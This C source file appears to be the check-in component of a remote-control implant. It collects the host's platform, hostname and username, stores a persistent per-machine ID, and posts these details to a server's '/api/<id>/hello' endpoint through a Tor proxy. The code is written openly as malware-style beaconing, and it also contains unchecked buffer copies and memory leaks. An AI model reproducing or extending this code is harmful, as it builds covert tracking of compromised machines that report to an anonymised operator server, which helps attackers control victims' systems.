#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <curl/curl.h>
#include <unistd.h>

#define BUFFER_SIZE 256

#define SAVE_FILE "./save"

struct url_data {
    size_t size;
    char* data;
};
char *UID;
char *PLATFORM;
char *HOSTNAME;
char *USERNAME;
const char *URL;
const char *URL_TOR;

size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
    size_t index = data->size;
    size_t n = (size * nmemb);
    char* tmp;
    data->size += (size * nmemb);
    fprintf(stderr, "data at %p size=%ld nmemb=%ld\n", ptr, size, nmemb);
    tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */
    if(tmp) {
        data->data = tmp;
    } else {
        if(data->data) {
            free(data->data);
        }
        fprintf(stderr, "Failed to allocate memory.\n");
        return 0;
    }
    memcpy((data->data + index), ptr, n);
    data->data[data->size] = '\0';
    return size * nmemb;
}

char* getUniqueID()
{
    char *data = malloc(BUFFER_SIZE);
    FILE *f;
    f = fopen(SAVE_FILE,"a+");
    if(f != NULL) fseek(f, 0, SEEK_END);
    if(!(UID!= NULL && UID[0] == '\0')) return UID;
    if(ftell(f) == 0)
    {
        fclose(f);
        srand(time(0));
        int random = rand();
        f = fopen(SAVE_FILE,"w");
        fprintf(f,"%s_%d\n",USERNAME,random);
        sprintf(data,"%s_%d",USERNAME,random);
        fclose(f);
        strcpy(UID,data);
        return data;
    } else {
        fclose(f);
        f = fopen(SAVE_FILE,"r");
        fscanf(f,"%s",data);
        fclose(f);
        strcpy(UID,data);
        return data;
    }
}

char* getRequest(char *path)
{
    CURL *curl;
    CURLcode res;
    struct url_data data;
    data.size = 0;
    data.data = malloc(4096);
    if(data.data == NULL) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    return data.data;
}

char* postRequest(char *path, char *post_data)
{
    CURL *curl;
    CURLcode res;
    struct url_data data;
    data.size = 0;
    data.data = malloc(4096);
    if(data.data == NULL) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }
    curl = curl_easy_init();
    if(curl) {
      char url[BUFFER_SIZE];
      strcpy(url, URL);
      strcat(url, path);
      curl_easy_setopt(curl, CURLOPT_URL, url);
      curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
      curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
      res = curl_easy_perform(curl);
      if(res != CURLE_OK)
          fprintf(stderr, "curl_easy_perform() failed: %s\n",
                  curl_easy_strerror(res));
      curl_easy_cleanup(curl);
    }
    return data.data;
}

char* sayhello()
{
    char *data = malloc(BUFFER_SIZE);
    char *path = malloc(BUFFER_SIZE);
    char *post_data = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/hello", getUniqueID());
    sprintf(post_data, "platform=%s&hostname=%s&username=%s",
            PLATFORM,HOSTNAME,USERNAME);
    data = postRequest(path, post_data);
    return data;
}

void setup()
{
    UID = malloc(BUFFER_SIZE);
    PLATFORM = malloc(BUFFER_SIZE);
    HOSTNAME = malloc(BUFFER_SIZE);
    USERNAME = malloc(BUFFER_SIZE);
    URL = getenv("URL");
    URL_TOR = getenv("URL_TOR");
    #if __APPLE__
        PLATFORM = "MAC OS";
    #elif _WIN32
        PLATFORM = "WINDOWS";
    #elif __LINUX__
        PLATFORM = "LINUX";
    #else
        PLATFORM = "UNKNOWN";
    #endif
    gethostname(HOSTNAME, BUFFER_SIZE);
    getlogin_r(USERNAME, BUFFER_SIZE);
}

int main()
{
    setup();
    char *data = malloc(BUFFER_SIZE);
    data = sayhello();
    printf("%s", data);
}
